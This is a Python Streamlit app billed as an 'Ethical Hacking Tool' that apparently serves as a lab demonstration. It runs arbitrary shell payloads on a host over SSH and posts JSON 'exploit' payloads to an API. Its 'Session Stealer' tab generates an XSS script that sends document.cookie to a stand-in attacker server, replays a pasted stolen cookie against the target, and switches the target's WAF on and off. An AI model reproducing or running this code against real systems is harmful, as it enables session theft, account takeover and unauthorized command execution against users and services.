import streamlit as st
import paramiko
import requests
import json

st.title("Ethical Hacking Tool")
# add a third tab for session stealing demonstration
tab1 , tab2, tab3 = st.tabs(["Payload Execution", "API Testing", "Session Stealer"])
with tab1:
    st.title("Remote Payload Runner")
    # 1. Target Configuration
    with st.sidebar:
        host = st.text_input("Target IP/Host", value="192.168.1.50")
        user = st.text_input("Username", value="admin")
        pwd = st.text_input("Password", type="password")

    # 2. Payload Creation
    payload = st.text_area("Enter Shell Script / Payload", 
                        value="echo 'Application Solved!' > /tmp/status.txt")

    if st.button("🚀 Execute Payload"):
        try:
            # Create SSH Client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to remote system
            client.connect(hostname=host, username=user, password=pwd)
            
            # Execute the payload
            stdin, stdout, stderr = client.exec_command(payload)
            
            # Show results
            st.success("Execution Complete!")
            st.code(stdout.read().decode())
            
            client.close()
        except Exception as e:
            st.error(f"Failed: {e}")
with tab2:
    st.title("Web App Exploit/Solver")

    target_url = st.text_input("Application URL", "http://target-app.local/api/v1")
    exploit_data = st.text_area("JSON Payload", '{"cmd": "solve", "token": "hidden_123"}')

    if st.button("Submit Payload"):
        # Sending the payload to 'solve' the remote app logic
        response = requests.post(target_url, data=exploit_data, headers={"Content-Type": "application/json"})
        
        if response.status_code == 200:
            st.balloons()
            st.success("Application Solved! Response below:")
            st.json(response.json())
        else:
            st.warning(f"Response Code: {response.status_code}")
            st.text(response.text)

# session stealer demonstration tab
with tab3:
    st.title("Session Stealer Demo")
    st.markdown(
        """This tab shows how an attacker could exfiltrate a victim's session
        token and then reuse it against our target application. In a real
        penetration test the first step would be to get the user to load
        malicious JavaScript (for example via an XSS flaw). Below is a
        simple snippet that steals `document.cookie` and sends it to a fake
        attacker endpoint.  We'll also allow you to take a stolen cookie and
        attempt to access a protected resource on the target app.  The WAF on
        the target should detect or block these attempts when it's enabled.
        """
    )

    target_url = st.text_input("Target App Base URL", "http://localhost:5000")
    attacker_host = st.text_input("Attacker Server (for JS exfil)", "http://attacker.example.local/capture")

    if st.checkbox("Show malicious JavaScript payload"):
        js = (
            "<script>var i=new Image();"
            f"i.src=\"{attacker_host}?cookie=\"+encodeURIComponent(document.cookie);</script>"
        )
        st.code(js, language="html")
        st.info("A real victim visiting a page containing this script would send their cookies to the attacker's server.")

    stolen_cookie = st.text_input("Stolen Cookie (paste here)", "")
    if st.button("Use stolen cookie against target"):
        if not stolen_cookie:
            st.warning("Please provide a cookie string to use.")
        else:
            headers = {"Cookie": stolen_cookie}
            try:
                resp = requests.get(f"{target_url}/data", headers=headers, timeout=5)
                st.write(f"Response code {resp.status_code}")
                st.text(resp.text)
            except Exception as e:
                st.error(f"Error contacting target: {e}")

    # controls for WAF toggle on target
    if st.button("Enable WAF on target"):
        try:
            r = requests.post(f"{target_url}/waf/enable")
            st.success(f"Requested WAF enable, status {r.status_code}")
        except Exception as e:
            st.error(f"Failed to contact target: {e}")
    if st.button("Disable WAF on target"):
        try:
            r = requests.post(f"{target_url}/waf/disable")
            st.success(f"Requested WAF disable, status {r.status_code}")
        except Exception as e:
            st.error(f"Failed to contact target: {e}")
